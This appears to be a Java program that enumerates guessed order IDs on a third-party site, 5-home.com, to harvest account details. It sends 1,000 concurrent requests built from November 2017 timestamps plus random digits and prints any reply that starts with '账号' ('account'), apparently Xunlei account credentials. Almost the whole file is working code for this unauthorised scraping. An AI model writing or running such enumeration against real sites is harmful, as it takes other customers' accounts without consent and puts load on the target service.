package org.chm;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import static javafx.scene.input.KeyCode.R;

/**
 * Created by charming on 2017/12/21.
 */
public class GetXunLei {

    private static ExecutorService threadPool;
    private String[] month = {"8", "9", "10", "11","12"};


    public static void main(String[] args) {
        for (int i = 0; i < 1000; i++) {
            StringBuilder url = new StringBuilder("http://www.5-home.com/search.html?ddid=201711");
            int day = new Random().nextInt(29)+1;
            System.out.println(day);
            String curDay = String.valueOf(day);
            if (day<10)
            {
                curDay = "0"+curDay;
            }

            url.append(curDay);
            int hour = new Random().nextInt(23);
            String hr = "00";
            if (hour<10)
            {
                hr = "0"+String.valueOf(hour);
            }else {
                hr = String.valueOf(hour);
            }


            int minu = new Random().nextInt(59);
            String min = String.valueOf(minu);
            if (minu<10)
            {
                min = "0"+min;
            }

            int second = new Random().nextInt(59);
            String sec = String.valueOf(second);
            if (second<10)
            {
                sec = "0"+sec;
            }

            url.append(hr);
            url.append(min);
            url.append(sec);

            String path = getRandom5(url.toString());
//            System.out.println(path);
            getThreadPool().execute(() -> {
                getInputStreamWlk(path+"&type=1");
            });

        }

//        getInputStreamWlk("http://www.5-home.com/search.html?ddid=2017122109395343837&type=1");
    }
    private static ExecutorService getThreadPool()
    {
        if(threadPool == null)
        {
            threadPool = Executors.newCachedThreadPool();
        }
        return threadPool;
    }
    private static String getRandom5(String key) {
        Random r = new Random();
        for (int j = 0; j < 5; j++)
        {
            key = key+ r.nextInt(10);
        }
        return key;
    }


    private static void getInputStreamWlk(String path){
        System.out.println(path);
        InputStream inputStream = null;
        try {
            URL url = new URL(path);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(30000);
            conn.setRequestMethod("GET");
            InputStream in = conn.getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            int len = 0;
            byte[] b = new byte[1024];
            while ((len = in.read(b, 0, b.length)) != -1) {
                baos.write(b, 0, len);
            }
            byte[] bytes =  baos.toByteArray();
            String result = new String(bytes);
            if (result.matches("^账号(.*)"))
            {
                System.out.println(result);
            }
//            inputStream = new ByteArrayInputStream(bytes);
            in.close();
            conn.disconnect();
        } catch (Exception e) {
//			System.out.println("wlk请求地址webservice失败 超时。。。。。");
        }
    }
}
